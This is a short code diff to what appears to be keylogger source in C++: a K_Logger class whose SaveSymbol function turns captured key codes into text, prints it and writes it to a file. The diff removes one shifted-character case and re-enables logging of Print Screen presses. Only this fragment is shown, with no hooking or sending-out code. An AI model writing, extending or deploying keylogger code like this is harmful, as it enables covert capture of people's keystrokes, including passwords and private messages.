@@ -506,12 +506,6 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToDoc("z");
 		}
 		break;
-	case 192:
-		if (GetAsyncKeyState(VK_LSHIFT))
-		{
-			cout << "À";
-		}
-		break;
 
 
 
@@ -703,10 +697,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc("  *Left_ALT*  ");
 		break;
 
-	/*case VK_SNAPSHOT:
+	case VK_SNAPSHOT:
 		cout << "  *PRINT_SCREEN*  ";
 		WriteToDoc("  *PRINT_SCREEN*  ");
-		break;*/
+		break;
 
 	case VK_CAPITAL:
 		cout << "  *CAPS_LOCK*  ";
